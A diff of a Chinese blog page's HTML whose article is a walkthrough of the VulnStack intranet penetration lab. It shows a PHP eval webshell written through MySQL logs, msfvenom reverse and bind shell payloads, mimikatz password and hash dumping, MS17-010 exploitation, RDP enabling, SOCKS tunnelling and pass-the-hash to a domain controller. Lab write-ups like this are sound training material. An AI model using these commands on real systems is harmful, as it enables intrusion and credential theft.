@@ -125,7 +125,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
@@ -215,7 +215,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了一下红日安全的VulnStack，一个内网渗透靶场，挺好玩的，而且对新手也比较友好，感觉自己对Metasploit和CobaltStike的操作也更熟悉了，在这里记录一下。靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了一下红日安全的VulnStack，一个内网渗透靶场，挺好玩的，而且对新手也比较友好，感觉自己对Metasploit和CobaltStike的操作也更熟悉了，在这里记录一下。靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>kali攻击机：192.168.229.133</p>
 <p>Windows 7 x64：192.168.52.143、192.168.229.138</p>
 <p>Windows Server 2008：192.168.52.138</p>
@@ -225,95 +225,95 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sC -A -Pn -p- --min-rate 5000 192.168.229.138                                                                        </span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 04:45 EDT</span><br><span class="line">Nmap scan report for 192.168.229.138</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: GOD)</span><br><span class="line">1025/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1026/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1027/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1028/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1029/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1030/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql        MySQL (unauthorized)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=stu1.god.org</span><br><span class="line">| Not valid before: 2022-06-29T05:13:38</span><br><span class="line">|_Not valid after:  2022-12-29T05:13:38</span><br><span class="line">|_ssl-date: 2022-07-01T08:46:49+00:00; -2s from scanner time.</span><br><span class="line">MAC Address: 00:0C:29:58:D7:1A (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m01s, deviation: 3h59m59s, median: -2s</span><br><span class="line">|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:58:d7:1a (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: stu1</span><br><span class="line">|   NetBIOS computer name: STU1\x00</span><br><span class="line">|   Domain name: god.org</span><br><span class="line">|   Forest name: god.org</span><br><span class="line">|   FQDN: stu1.god.org</span><br><span class="line">|_  System time: 2022-07-01T16:46:35+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-07-01T08:46:35</span><br><span class="line">|_  start_date: 2022-07-01T08:35:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.35 ms 192.168.229.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.94 seconds</span><br></pre></td></tr></table></figure>
 
 <p>可以看到开放了80、3306、3389、445这些端口。接下来我们去80端口看看，发现一个phpstudy探针的界面：</p>
-<p><img src="/images/62bf494c1d64b07066dbc54f.png" alt="image-20220701165347277"></p>
+<p><a href="/images/62bf494c1d64b07066dbc54f.png" title="image-20220701165347277" class="gallery-item"><img src="/images/62bf494c1d64b07066dbc54f.png" alt="image-20220701165347277"></a></p>
 <p>这是版本老一点的phpstudy会出现的界面，我们在该界面中可以利用弱口令root&#x2F;root成功连接MySQL：</p>
-<p><img src="/images/62bf49821d64b07066dbe9a9.png" alt="image-20220701165634053"></p>
+<p><a href="/images/62bf49821d64b07066dbe9a9.png" title="image-20220701165634053" class="gallery-item"><img src="/images/62bf49821d64b07066dbe9a9.png" alt="image-20220701165634053"></a></p>
 <p>dirsearch扫描后，还有这些目录：</p>
-<p><img src="/images/62bf498e1d64b07066dbf18a.png" alt="image-20220701165726039"></p>
+<p><a href="/images/62bf498e1d64b07066dbf18a.png" title="image-20220701165726039" class="gallery-item"><img src="/images/62bf498e1d64b07066dbf18a.png" alt="image-20220701165726039"></a></p>
 <h3 id="MySQL写入webshell"><a href="#MySQL写入webshell" class="headerlink" title="MySQL写入webshell"></a>MySQL写入webshell</h3><p>phpstudy默认是安装了phpmyadmin的，那我们就可以利用刚刚得到的账号密码来登陆phpmyadmin了。登陆之后，当然就是要看看能不能写个webshell了，首先看看写文件的配置开了没：</p>
-<p><img src="/images/62bf49a11d64b07066dbfe87.png" alt="image-20220701170000896"></p>
+<p><a href="/images/62bf49a11d64b07066dbfe87.png" title="image-20220701170000896" class="gallery-item"><img src="/images/62bf49a11d64b07066dbfe87.png" alt="image-20220701170000896"></a></p>
 <p>没打开，那我们就利用日志写webshell吧，看看日志的全局变量：</p>
-<p><img src="/images/62bf49af1d64b07066dc07be.png" alt="image-20220701170124949"></p>
+<p><a href="/images/62bf49af1d64b07066dc07be.png" title="image-20220701170124949" class="gallery-item"><img src="/images/62bf49af1d64b07066dc07be.png" alt="image-20220701170124949"></a></p>
 <p>那我们利用如下SQL语句给改一下吧：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf49ba1d64b07066dc0fdf.png" alt="image-20220701170417177"></p>
+<p><a href="/images/62bf49ba1d64b07066dc0fdf.png" title="image-20220701170417177" class="gallery-item"><img src="/images/62bf49ba1d64b07066dc0fdf.png" alt="image-20220701170417177"></a></p>
 <p>接下来再随便写个select语句把webshell写进日志里：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
 
 <p>这样就成功写入webshell了：</p>
-<p><img src="/images/62bf49c61d64b07066dc1787.png" alt="image-20220701170614588"></p>
+<p><a href="/images/62bf49c61d64b07066dc1787.png" title="image-20220701170614588" class="gallery-item"><img src="/images/62bf49c61d64b07066dc1787.png" alt="image-20220701170614588"></a></p>
 <p>蚁剑连接，成功突破外网！</p>
 <h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><h3 id="内网初探"><a href="#内网初探" class="headerlink" title="内网初探"></a>内网初探</h3><p>首先构造个windows的马：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.229.133 LPORT=1234 -f exe -o ma.exe</span><br></pre></td></tr></table></figure>
 
 <p>然后利用蚁剑给传上去，接着在msf的exploit&#x2F;multi&#x2F;handler的模块中做好相应配置：</p>
-<p><img src="/images/62bf49d71d64b07066dc23d8.png" alt="image-20220701172030141"></p>
+<p><a href="/images/62bf49d71d64b07066dc23d8.png" title="image-20220701172030141" class="gallery-item"><img src="/images/62bf49d71d64b07066dc23d8.png" alt="image-20220701172030141"></a></p>
 <p>在蚁剑终端中允许木马，进入meterpreter。把mimikatz.exe利用蚁剑也上传一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ./Desktop/mimikatz C:\\</span><br><span class="line">shell</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#权限提升</span><br><span class="line">sekurlsa::logonPasswords#明文抓取</span><br></pre></td></tr></table></figure>
 
 <p>尝试拿一下系统密码：</p>
-<p><img src="/images/62bf4a231d64b07066dc5439.jpg" alt="image-20220701174721144"></p>
+<p><a href="/images/62bf4a231d64b07066dc5439.jpg" title="image-20220701174721144" class="gallery-item"><img src="/images/62bf4a231d64b07066dc5439.jpg" alt="image-20220701174721144"></a></p>
 <p>拿到明文密码：</p>
-<p><img src="/images/62bf4a3c1d64b07066dc658d.jpg" alt="image-20220701174839187"></p>
+<p><a href="/images/62bf4a3c1d64b07066dc658d.jpg" title="image-20220701174839187" class="gallery-item"><img src="/images/62bf4a3c1d64b07066dc658d.jpg" alt="image-20220701174839187"></a></p>
 <p>拿到密码，接下来尝试打开靶机的远程桌面。首先我们利用nmap扫一下3389端口，但是结果为filtered，3389端口存在防火墙过滤。我们可以利用msf的post&#x2F;windows&#x2F;manage&#x2F;enable_rdp模块去尝试防火墙：</p>
-<p><img src="/images/62bf4a5b1d64b07066dc7b04.jpg" alt="image-20220701182103081"></p>
+<p><a href="/images/62bf4a5b1d64b07066dc7b04.jpg" title="image-20220701182103081" class="gallery-item"><img src="/images/62bf4a5b1d64b07066dc7b04.jpg" alt="image-20220701182103081"></a></p>
 <p>再用nmap扫一下，成功关闭防火墙：</p>
-<p><img src="/images/62bf4a651d64b07066dc8468.jpg" alt="image-20220701182134202"></p>
+<p><a href="/images/62bf4a651d64b07066dc8468.jpg" title="image-20220701182134202" class="gallery-item"><img src="/images/62bf4a651d64b07066dc8468.jpg" alt="image-20220701182134202"></a></p>
 <p>那我们接下来就尝试打开靶机的远程桌面，利用post&#x2F;windows&#x2F;manage&#x2F;enable_rdp中的rdesktop命令进行远程登陆：</p>
-<p><img src="/images/62bf4a771d64b07066dc9179.jpg" alt="image-20220701182419901"></p>
+<p><a href="/images/62bf4a771d64b07066dc9179.jpg" title="image-20220701182419901" class="gallery-item"><img src="/images/62bf4a771d64b07066dc9179.jpg" alt="image-20220701182419901"></a></p>
 <p>至此，对这台win7的渗透基本完成，接下来继续进行内网横向移动，可以利用如下命令拿到一些内网信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net time /domain    #判断主域，主域服务器一般做时间服务器</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line">ipconfig /all #查询本机IP段，所在域等</span><br></pre></td></tr></table></figure>
 
 <p><code>net view</code>：</p>
-<p><img src="/images/62bf4a891d64b07066dc9fc2.jpg" alt="image-20220701172233614"></p>
+<p><a href="/images/62bf4a891d64b07066dc9fc2.jpg" title="image-20220701172233614" class="gallery-item"><img src="/images/62bf4a891d64b07066dc9fc2.jpg" alt="image-20220701172233614"></a></p>
 <p><code>net config Workstation</code>：</p>
-<p><img src="/images/62bf4a951d64b07066dca9e1.jpg" alt="image-20220701172322585"></p>
+<p><a href="/images/62bf4a951d64b07066dca9e1.jpg" title="image-20220701172322585" class="gallery-item"><img src="/images/62bf4a951d64b07066dca9e1.jpg" alt="image-20220701172322585"></a></p>
 <p>可以看到登陆域为GOD，计算机名为STU1。</p>
 <p><code>net user</code>：</p>
-<p><img src="/images/62bf4aa61d64b07066dcb6f5.jpg" alt="image-20220701172424042"></p>
+<p><a href="/images/62bf4aa61d64b07066dcb6f5.jpg" title="image-20220701172424042" class="gallery-item"><img src="/images/62bf4aa61d64b07066dcb6f5.jpg" alt="image-20220701172424042"></a></p>
 <p><code>net user /domain</code>：</p>
-<p><img src="/images/62bf4ab51d64b07066dcc315.jpg" alt="image-20220701172506188"></p>
+<p><a href="/images/62bf4ab51d64b07066dcc315.jpg" title="image-20220701172506188" class="gallery-item"><img src="/images/62bf4ab51d64b07066dcc315.jpg" alt="image-20220701172506188"></a></p>
 <p><code>net localgroup administrators</code>：</p>
-<p><img src="/images/62bf4ac01d64b07066dccad9.jpg" alt="image-20220701172731217"></p>
+<p><a href="/images/62bf4ac01d64b07066dccad9.jpg" title="image-20220701172731217" class="gallery-item"><img src="/images/62bf4ac01d64b07066dccad9.jpg" alt="image-20220701172731217"></a></p>
 <p><code>net view /domain</code>：</p>
-<p><img src="/images/62bf4acc1d64b07066dcd4a8.jpg" alt="image-20220701172803499"></p>
+<p><a href="/images/62bf4acc1d64b07066dcd4a8.jpg" title="image-20220701172803499" class="gallery-item"><img src="/images/62bf4acc1d64b07066dcd4a8.jpg" alt="image-20220701172803499"></a></p>
 <p>只有一个GOD域。</p>
 <p><code>net user Administrator /domain</code>：</p>
-<p><img src="/images/62bf4ad61d64b07066dcdc79.jpg" alt="image-20220701172953199"></p>
+<p><a href="/images/62bf4ad61d64b07066dcdc79.jpg" title="image-20220701172953199" class="gallery-item"><img src="/images/62bf4ad61d64b07066dcdc79.jpg" alt="image-20220701172953199"></a></p>
 <p><code>net group &quot;domain admins&quot; /domain</code>：</p>
-<p><img src="/images/62bf4ae71d64b07066dce805.jpg" alt="image-20220701173128166"></p>
+<p><a href="/images/62bf4ae71d64b07066dce805.jpg" title="image-20220701173128166" class="gallery-item"><img src="/images/62bf4ae71d64b07066dce805.jpg" alt="image-20220701173128166"></a></p>
 <p>可以看到Administrator为域管。</p>
 <p><code>net group &quot;domain controllers &quot; /domain</code>：</p>
-<p><img src="/images/62bf4af81d64b07066dcf522.jpg" alt="image-20220701173317196"></p>
+<p><a href="/images/62bf4af81d64b07066dcf522.jpg" title="image-20220701173317196" class="gallery-item"><img src="/images/62bf4af81d64b07066dcf522.jpg" alt="image-20220701173317196"></a></p>
 <p>DC为OWA这台主机。</p>
 <p><code>ipconfig /all</code>：</p>
-<p><img src="/images/62bf4b041d64b07066dcfdb1.jpg" alt="image-20220701182815869"></p>
+<p><a href="/images/62bf4b041d64b07066dcfdb1.jpg" title="image-20220701182815869" class="gallery-item"><img src="/images/62bf4b041d64b07066dcfdb1.jpg" alt="image-20220701182815869"></a></p>
 <p>可以得知这台主机的内网IP为192.168.52.143，我们可以利用nmap来扫描一波内网（这台主机内置nmap了）：</p>
-<p><img src="/images/62bf4b121d64b07066dd07ce.jpg" alt="image-20220701183124997"></p>
+<p><a href="/images/62bf4b121d64b07066dd07ce.jpg" title="image-20220701183124997" class="gallery-item"><img src="/images/62bf4b121d64b07066dd07ce.jpg" alt="image-20220701183124997"></a></p>
 <p>拿到内网的另外两台主机的IP为192.168.52.138和192.168.52.141。</p>
 <h3 id="内网突破"><a href="#内网突破" class="headerlink" title="内网突破"></a>内网突破</h3><p>接下来对这两个内网主机的渗透都基本依托攻击机的msf完成，所以我们这里直接在msf中添加路由来使攻击机可以访问到内网资源：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4b221d64b07066dd131f.jpg" alt="image-20220701195219880"></p>
+<p><a href="/images/62bf4b221d64b07066dd131f.jpg" title="image-20220701195219880" class="gallery-item"><img src="/images/62bf4b221d64b07066dd131f.jpg" alt="image-20220701195219880"></a></p>
 <p>接着我们尝试扫描永恒之蓝：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4b2c1d64b07066dd1a11.jpg" alt="image-20220701195513265"></p>
+<p><a href="/images/62bf4b2c1d64b07066dd1a11.jpg" title="image-20220701195513265" class="gallery-item"><img src="/images/62bf4b2c1d64b07066dd1a11.jpg" alt="image-20220701195513265"></a></p>
 <p>445端口开启，存在smb服务，看看是否存在永恒之蓝：</p>
-<p><img src="/images/62bf4b361d64b07066dd2104.jpg" alt="image-20220701195636083"></p>
+<p><a href="/images/62bf4b361d64b07066dd2104.jpg" title="image-20220701195636083" class="gallery-item"><img src="/images/62bf4b361d64b07066dd2104.jpg" alt="image-20220701195636083"></a></p>
 <p>很有可能存在，那我们尝试打一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">options</span><br><span class="line">set command whoami</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4b571d64b07066dd3a41.jpg" alt="image-20220701211222844"></p>
+<p><a href="/images/62bf4b571d64b07066dd3a41.jpg" title="image-20220701211222844" class="gallery-item"><img src="/images/62bf4b571d64b07066dd3a41.jpg" alt="image-20220701211222844"></a></p>
 <p>成功执行命令！那我们接下来再看一下这台主机的端口，很简单，只需要将command参数改为<code>netstat -na</code>继续run一下就可以了：</p>
-<p><img src="/images/62bf4b641d64b07066dd4486.jpg" alt="image-20220701211350099"></p>
+<p><a href="/images/62bf4b641d64b07066dd4486.jpg" title="image-20220701211350099" class="gallery-item"><img src="/images/62bf4b641d64b07066dd4486.jpg" alt="image-20220701211350099"></a></p>
 <p>并未发现3389端口，那我们再利用如下命令再开一下3389端口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4b801d64b07066dd5b2e.jpg" alt="image-20220701212047024"></p>
+<p><a href="/images/62bf4b801d64b07066dd5b2e.jpg" title="image-20220701212047024" class="gallery-item"><img src="/images/62bf4b801d64b07066dd5b2e.jpg" alt="image-20220701212047024"></a></p>
 <p>接着再查看一下端口：</p>
-<p><img src="/images/62bf4b891d64b07066dd621e.jpg" alt="image-20220701212102819"></p>
+<p><a href="/images/62bf4b891d64b07066dd621e.jpg" title="image-20220701212102819" class="gallery-item"><img src="/images/62bf4b891d64b07066dd621e.jpg" alt="image-20220701212102819"></a></p>
 <p>3389端口被成功打开，接着就是要开启远程桌面了。但是这台主机并不能访问外网，因此不能访问我们的攻击机。这里我们使用别的师傅提到的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/275436.html">隐藏通信隧道技术</a>，借助那台win7作为跳板机完成内网穿透。</p>
 <p>将ew_for_win32.exe给Win7上传上去，接着在我们攻击机本地添加转接隧道：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux -s rcsocks -l 1080 -e 4444 #要先把4444端口给打开</span><br></pre></td></tr></table></figure>
@@ -321,31 +321,31 @@
 <p>接着在Win7中执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d 192.168.229.133 -e 4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4b9c1d64b07066dd6edf.jpg" alt="image-20220701212740562"></p>
+<p><a href="/images/62bf4b9c1d64b07066dd6edf.jpg" title="image-20220701212740562" class="gallery-item"><img src="/images/62bf4b9c1d64b07066dd6edf.jpg" alt="image-20220701212740562"></a></p>
 <p>隧道搭建成功。接下来我们修改proxychains4.conf添加如下代理：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5  192.168.229.133 1080</span><br></pre></td></tr></table></figure>
 
 <p>保存并退出后执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4ba61d64b07066dd761d.jpg" alt="image-20220701213408165"></p>
+<p><a href="/images/62bf4ba61d64b07066dd761d.jpg" title="image-20220701213408165" class="gallery-item"><img src="/images/62bf4ba61d64b07066dd761d.jpg" alt="image-20220701213408165"></a></p>
 <p>使用之前拿到的域管的账号，成功登陆！拿下192.168.52.141：</p>
-<p><img src="/images/62bf4bb01d64b07066dd7e9f.jpg" alt="image-20220701213500383"></p>
+<p><a href="/images/62bf4bb01d64b07066dd7e9f.jpg" title="image-20220701213500383" class="gallery-item"><img src="/images/62bf4bb01d64b07066dd7e9f.jpg" alt="image-20220701213500383"></a></p>
 <p>接着我们开始打192.168.52.138，但是这台主机利用刚刚上面的方法，却无法拿到远程桌面。</p>
-<p><img src="/images/62bf4bbc1d64b07066dd878c.jpg" alt="image-20220701214410519"></p>
+<p><a href="/images/62bf4bbc1d64b07066dd878c.jpg" title="image-20220701214410519" class="gallery-item"><img src="/images/62bf4bbc1d64b07066dd878c.jpg" alt="image-20220701214410519"></a></p>
 <p>一直连接不上。尝试拿Win7那台nmap扫一下192.168.52.138这台，才发现3389给设置了防火墙：</p>
-<p><img src="/images/62bf4bc91d64b07066dd919a.jpg" alt="image-20220701220224803"></p>
+<p><a href="/images/62bf4bc91d64b07066dd919a.jpg" title="image-20220701220224803" class="gallery-item"><img src="/images/62bf4bc91d64b07066dd919a.jpg" alt="image-20220701220224803"></a></p>
 <p>那这台看来确实是没法拿到远程桌面了。除非是进去给他防火墙关了：</p>
-<p><img src="/images/62bf4bdb1d64b07066dd9e02.jpg" alt="image-20220701220729492"></p>
+<p><a href="/images/62bf4bdb1d64b07066dd9e02.jpg" title="image-20220701220729492" class="gallery-item"><img src="/images/62bf4bdb1d64b07066dd9e02.jpg" alt="image-20220701220729492"></a></p>
 <p>这下再尝试利用刚刚的方法拿远程桌面就能拿到了：</p>
-<p><img src="/images/62bf4be51d64b07066dda4f6.jpg" alt="image-20220701220711892"></p>
+<p><a href="/images/62bf4be51d64b07066dda4f6.jpg" title="image-20220701220711892" class="gallery-item"><img src="/images/62bf4be51d64b07066dda4f6.jpg" alt="image-20220701220711892"></a></p>
 <p>但是这很明显没什么意思，那我们 就换个思路打它，试一下之前用mimikatz抓取的哈希值进行哈希传递登录域控：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::pth /domain:god.org /user:administrator /ntlm:your_ntml_hash</span><br></pre></td></tr></table></figure>
 
 <p>尝试访问域控共享服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/62bf4bf91d64b07066ddb160.jpg" alt="image-20220702022902556"></p>
+<p><a href="/images/62bf4bf91d64b07066ddb160.jpg" title="image-20220702022902556" class="gallery-item"><img src="/images/62bf4bf91d64b07066ddb160.jpg" alt="image-20220702022902556"></a></p>
 <p>访问成功。因为192.168.52.138这台不出网，但是又因为我们刚刚已经设置路由，所以接下来我们可以利用正向连接来拿shell。首先构造个正向连接的攻击载荷：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp  LPORT=456 -f exe -o xxx.exe</span><br></pre></td></tr></table></figure>
 
@@ -353,31 +353,36 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload xxx.exe C:\\</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\&gt;copy xxx.exe \\192.168.52.138\C$</span><br><span class="line">C:\&gt;schtasks /create /tn &quot;evil_task&quot; /tr C:\yyy.exe /sc once /st 12:00 /S 192.168.52.138 /RU System  /u administrator /p &quot;your_password&quot;</span><br></pre></td></tr></table></figure>
 
 <p>接着利用exploit&#x2F;multi&#x2F;handler模块，设置payload为windows&#x2F;meterpreter&#x2F;bind_tcp，设置好rhost和lport，然后run就可以了：</p>
-<p><img src="/images/62bf4c041d64b07066ddb7ca.jpg" alt="image-20220702025146824"></p>
